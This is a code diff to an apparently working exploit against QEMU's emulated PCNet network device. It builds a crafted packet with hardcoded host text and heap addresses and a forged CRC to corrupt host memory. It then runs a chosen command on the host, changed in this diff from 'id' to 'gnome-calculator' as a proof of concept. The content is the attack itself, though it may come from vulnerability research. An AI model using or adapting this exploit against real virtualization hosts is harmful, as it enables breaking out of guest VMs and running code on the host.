@@ -273,6 +273,8 @@ void pcnet_packet_send(struct pcnet_desc *desc, void *buffer,
 	}
 }
 
+#define BUFFER_OFFSET 0xffffffff
+
 int main()
 {
 	struct pcnet_config pcnet_config;
@@ -300,13 +302,13 @@ int main()
 	uint64_t text_base = 0x5b1b1e7b7000;
 	uint64_t phy_base = 0x7b09a4000000;
 	uint64_t *packet_ptr;
-	char* str = "id";
+	char* str = malloc(0x10);
+	strcpy(str, "gnome-calculator");
 	packet_ptr = pcnet_packet;
 	for(int j=0x10; j<0x1f8; j += 3)
 	{
 		*(packet_ptr + j) = text_base+0x9e3b0;
-		*(packet_ptr + j + 1) = 0x424242424242;
-		*(packet_ptr + j + 2) = phy_base + gva_to_gpa(str);
+		*(packet_ptr + j + 1) = phy_base + gva_to_gpa(str);
 	}
 
 	iopl(3);
@@ -331,7 +333,7 @@ int main()
 	while (ptr != &pcnet_packet[PCNET_BUFFER_SIZE - 4])
 		CRC(fcs, *ptr++);
 
-	targetValue = (heapBaseAddr + 0x1463550 + 0x80 - 0x30) & 0xffffffff;
+	targetValue = (heapBaseAddr + BUFFER_OFFSET + 0x80 - 0x30) & 0xffffffff;
 
 	pcnet_packet_patch_crc(ptr, fcs, htonl(targetValue));
 
